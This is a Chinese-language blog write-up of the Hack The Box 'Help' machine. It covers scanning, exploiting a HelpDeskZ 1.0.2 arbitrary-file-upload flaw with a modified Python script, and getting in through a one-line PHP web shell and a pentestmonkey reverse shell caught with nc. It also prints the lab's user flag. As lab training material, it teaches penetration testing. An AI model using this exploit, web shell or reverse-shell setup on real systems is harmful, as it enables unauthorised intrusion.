@@ -1,0 +1,326 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB_Help | h4m5t's Blog</title><meta name="author" content="h4m5t"><meta name="copyright" content="h4m5t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集123456789101112131415161718192021222324┌──(root@kali)-[&#x2F;home&#x2F;h4m5t&#x2F;Desktop&#x2F;HTB&#x2F;Help]└─# echo &quot;10.129.230.159&quot; &gt; ip.txt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB_Help">
+<meta property="og:url" content="http://h4m5t.github.io/2024/09/18/HTB_Help/index.html">
+<meta property="og:site_name" content="h4m5t&#39;s Blog">
+<meta property="og:description" content="信息收集123456789101112131415161718192021222324┌──(root@kali)-[&#x2F;home&#x2F;h4m5t&#x2F;Desktop&#x2F;HTB&#x2F;Help]└─# echo &quot;10.129.230.159&quot; &gt; ip.txt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://h4m5t.github.io/img/HTB.png">
+<meta property="article:published_time" content="2024-09-18T15:42:30.000Z">
+<meta property="article:modified_time" content="2024-10-16T10:32:40.000Z">
+<meta property="article:author" content="h4m5t">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://h4m5t.github.io/img/HTB.png"><link rel="shortcut icon" href="/img/icon-H.png"><link rel="canonical" href="http://h4m5t.github.io/2024/09/18/HTB_Help/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB_Help',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-16 18:32:40'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="h4m5t's Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/HTB.png')"><nav id="nav"><span id="blog-info"><a href="/" title="h4m5t's Blog"><span class="site-name">h4m5t's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB_Help</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-18T15:42:30.000Z" title="发表于 2024-09-18 23:42:30">2024-09-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-16T10:32:40.000Z" title="更新于 2024-10-16 18:32:40">2024-10-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB/">HTB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTB_Help"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># echo &quot;10.129.230.159&quot; &gt; ip.txt </span></span><br><span class="line">                                                                                  </span><br><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV $(cat ip.txt)</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 01:33 AEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.230.159</span><br><span class="line">Host is up (0.012s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)</span><br><span class="line">|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)</span><br><span class="line">|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://help.htb/</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (application/json; charset=utf-8).</span></span><br><span class="line"><span class="string">Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>目录爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://help.htb&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                        </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                 </span><br><span class="line">                                                                        </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25</span><br><span class="line">Wordlist size: 220545</span><br><span class="line"></span><br><span class="line">Output File: /home/h4m5t/Desktop/HTB/Help/reports/http_help.htb/_24-09-24_12-53-02.txt</span><br><span class="line"></span><br><span class="line">Target: http://help.htb/</span><br><span class="line"></span><br><span class="line">[12:53:02] Starting:                                                    </span><br><span class="line">[12:53:03] 301 -  306B  - /support  -&gt;  http://help.htb/support/</span><br><span class="line">[12:53:04] 301 -  309B  - /javascript  -&gt;  http://help.htb/javascript/</span><br></pre></td></tr></table></figure>
+
+<p>或者使用gobuster</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># gobuster dir -u http://help.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://help.htb</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/support              (Status: 301) [Size: 306] [--&gt; http://help.htb/support/]                                                                  </span><br><span class="line">/javascript           (Status: 301) [Size: 309] [--&gt; http://help.htb/javascript/]      </span><br></pre></td></tr></table></figure>
+
+<p>或使用ffuf, 只显示成功的请求，并将扫描的输出结果同时显示在终端并保存到 scan_results.txt 文件中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://help.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -mc 200,301,302 | <span class="built_in">tee</span> scan_results.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>根据爆破的目录，找到一个上传点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://help.htb/support/</span><br></pre></td></tr></table></figure>
+
+<p>上传phpshell提示文件类型不允许，但其实文件已经上传成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># searchsploit &quot;HelpDeskZ&quot;</span></span><br><span class="line">------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                  |  Path</span><br><span class="line">------------------------------------------------ ---------------------------------</span><br><span class="line">HelpDeskZ 1.0.2 - Arbitrary File Upload         | php/webapps/40300.py</span><br><span class="line">HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injecti | php/webapps/41200.py</span><br><span class="line">Helpdeskz v2.0.2 - Stored XSS                   | php/webapps/52068.txt</span><br><span class="line">------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># searchsploit -m php/webapps/40300.py</span></span><br><span class="line">  Exploit: HelpDeskZ 1.0.2 - Arbitrary File Upload</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/40300</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/40300.py</span><br><span class="line">    Codes: N/A</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: ASCII text</span><br><span class="line">Copied to: /home/h4m5t/Desktop/HTB/Help/40300.py</span><br></pre></td></tr></table></figure>
+
+<p>优化修改后的Exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> [nameOfUploadedFile]&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基础 URL</span></span><br><span class="line">helpdeskzBaseUrl = <span class="string">&#x27;http://help.htb/support/uploads/tickets/&#x27;</span></span><br><span class="line">fileName = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间，避免时区错误</span></span><br><span class="line">r = requests.get(helpdeskzBaseUrl)</span><br><span class="line">currentTime = <span class="built_in">int</span>((datetime.datetime.strptime(r.headers[<span class="string">&#x27;date&#x27;</span>], <span class="string">&#x27;%a, %d %b %Y %H:%M:%S %Z&#x27;</span>) - datetime.datetime(<span class="number">1970</span>, <span class="number">1</span>, <span class="number">1</span>)).total_seconds())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试通过猜测时间来获得文件的实际URL</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">    plaintext = fileName + <span class="built_in">str</span>(currentTime - x)</span><br><span class="line">    md5hash = hashlib.md5(plaintext.encode()).hexdigest()  <span class="comment"># 将字符串编码为字节</span></span><br><span class="line">    url = helpdeskzBaseUrl + md5hash + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="comment">#    print(url)</span></span><br><span class="line">    response = requests.head(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Found!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sorry, I did not find anything&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上传文件phpshell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传后运行exp脚本，结果如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># python exploit.py phpshell.php</span></span><br><span class="line">Helpdeskz v1.0.2 - Unauthenticated shell upload exploit</span><br><span class="line">Found!</span><br><span class="line">http://help.htb/support/uploads/tickets/13985c5cd0fa35388f56480d778564b5.php</span><br></pre></td></tr></table></figure>
+
+<p>浏览器输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://help.htb/support/uploads/tickets/13985c5cd0fa35388f56480d778564b5.php?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=1000(<span class="built_in">help</span>) gid=1000(<span class="built_in">help</span>) <span class="built_in">groups</span>=1000(<span class="built_in">help</span>),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) </span><br></pre></td></tr></table></figure>
+
+<p>RCE利用成功。</p>
+<p>下载一个功能更强大的<code>php-reverse-shell</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+
+<p>修改php脚本中的IP为<code>tun0</code>的IP地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ip = &#x27;10.10.14.9&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>本地开启nc监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>上传<code>php-reverse-shell</code>，并使用exp脚本：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2024/09/18/HTB_Help/reverse_shell.jpg" alt="reverse_shell"></p>
+<p>拿到user_flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /home/help/user.txt</span><br><span class="line">2df113fbcfc65a5889ca9a2932054c9b</span><br></pre></td></tr></table></figure>
+
+<p>Tips: There are at least two exploitable vulnerabilities in HelpDeskZ 1.0.2. There’s an authenticated SQL injection that will allow you to read a SHA1 hash from the database and crack it, allowing for SSH access. There’s also an arbirtray file upload vulnerability that will allow you to upload a webshell and get execution that way. Either way, you end up with a shell as the same user.</p>
+<h1 id="稳定shell"><a href="#稳定shell" class="headerlink" title="稳定shell"></a>稳定shell</h1><p>这个 shell 可能是非交互式的，无法使用完整的终端功能（例如不能使用箭头键或者 tab 自动补全）。为了稳定它，可以使用以下命令使 shell 更加交互式：</p>
+<ol>
+<li><p>在目标机器的 shell 中，执行以下命令来获取伪终端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果目标机器上有 Python 3，使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>一般情况下到这里就可以了，不用继续。</p>
+</li>
+<li><p>在攻击者端（Netcat session），按下 <strong>Ctrl + Z</strong> 将会话挂起。</p>
+<p>注意，需要先将kali的zsh切换为bash！,如果使用zsh,可以将下面的命令链接起来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo;fg</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设置终端模式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
+
+<p>然后按 <strong>Enter</strong> 键，获得一个更稳定的交互 shell。</p>
+</li>
+<li><p>最后，在目标机器上执行以下命令，设置终端环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>现在拥有了目标机器的 Shell，接下来可以进行以下操作：</p>
+<ul>
+<li><p><strong>枚举系统信息</strong>：</p>
+<ul>
+<li>识别操作系统版本、内核版本、用户信息等：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>枚举权限</strong>：</p>
+<ul>
+<li>查看当前用户的权限，检查是否可以获得更多的特权。</li>
+</ul>
+</li>
+<li><p><strong>提权</strong>：</p>
+<ul>
+<li>如果当前 shell 权限有限，你可能想通过一些提权技术来获得 root 权限。你可以搜索系统是否存在已知的提权漏洞，或者利用 misconfiguration（如 SUID 位、错误配置的 Cron Jobs 等）进行提权。</li>
+</ul>
+</li>
+</ul>
+<p><img src= "/img/loading.gif" data-lazy-src="/2024/09/18/HTB_Help/shell.jpg" alt="shell"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用LinEnum.sh提权检查脚本（攻击机使用httpserver，目标机wget下载）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br><span class="line"><span class="built_in">chmod</span> +x LinEnum.sh</span><br><span class="line">./LinEnum.sh | <span class="built_in">tee</span> LinEnum-results.txt</span><br></pre></td></tr></table></figure>
+
+<p>version 0.982</p>
+<ul>
+<li>Example: .&#x2F;LinEnum.sh -s -k keyword -r report -e &#x2F;tmp&#x2F; -t</li>
+</ul>
+<p>OPTIONS:</p>
+<ul>
+<li>-k Enter keyword</li>
+<li>-e Enter export location</li>
+<li>-t Include thorough (lengthy) tests</li>
+<li>-s Supply current user password to check sudo perms (INSECURE)</li>
+<li>-r Enter report name</li>
+<li>-h Displays this help text</li>
+</ul>
+<p>注意，如果需要要目标机下载log文件到本地进行分析，可以在目标机使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p>或使用uname -a 查看系统版本</p>
